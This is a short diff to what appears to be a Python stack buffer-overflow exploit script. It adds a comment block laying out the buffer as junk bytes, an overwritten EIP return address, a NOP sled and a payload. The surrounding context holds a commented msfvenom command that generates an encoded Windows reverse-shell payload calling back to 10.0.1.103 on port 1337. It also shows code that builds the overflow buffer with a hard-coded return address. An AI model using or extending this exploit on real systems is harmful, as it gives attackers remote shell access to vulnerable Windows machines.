@@ -31,6 +31,18 @@ offset = 2004
 
 #msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXECFUNC=thread
 
+
+#----------------------------#
+#      Buffer Structure      #
+#----------------------------#
+# buffer = AAA...........AAA #
+# buffer = EIP - RET Address #
+# buffer = NOPSled           #
+# buffer = payload           #
+# buffer = BBB...........BBB #
+#----------------------------#
+
+
 buf  = '\x41'*offset
 buf += struct.pack("<L", 0x7cb32d69)
 buf += '\x90'*26
